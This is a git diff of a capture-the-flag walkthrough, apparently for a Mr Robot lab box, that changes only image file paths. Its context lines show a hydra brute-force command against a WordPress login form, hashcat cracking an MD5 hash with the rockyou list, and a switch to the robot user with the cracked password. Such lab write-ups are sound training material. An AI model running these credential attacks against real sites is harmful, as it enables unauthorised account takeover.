@@ -55,7 +55,7 @@ If you refresh the page you'll go to a wordpress site.
 
 
 
-<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (24) (6).png" alt=""><figcaption></figcaption></figure>
 
 Test to see what users exist in wordpress, if the user doesn't exist it will give an error saying the user is invalid.
 
@@ -68,7 +68,7 @@ hydra -L fsocity.dic -p test  $VICTIM http-post-form "/wp-login.php:log=^USER^&p
 .10.70.148%2Fwp-admin%2F&testcookie=1:Invalid username" -V -t 30    
 ```
 
-<figure><img src="../../.gitbook/assets/image (9) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (3) (5).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -184,7 +184,7 @@ hashcat -m 0 password.raw-md5 /usr/share/wordlists/rockyou.txt
 hashcat -m 0 password.raw-md5 /usr/share/wordlists/rockyou.txt --show
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -193,7 +193,7 @@ su robot
 Password: abcdefghijklmnopqrstuvwxyz
 ```
 
-<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1) (8).png" alt=""><figcaption></figcaption></figure>
 
 ### LinPeas
 
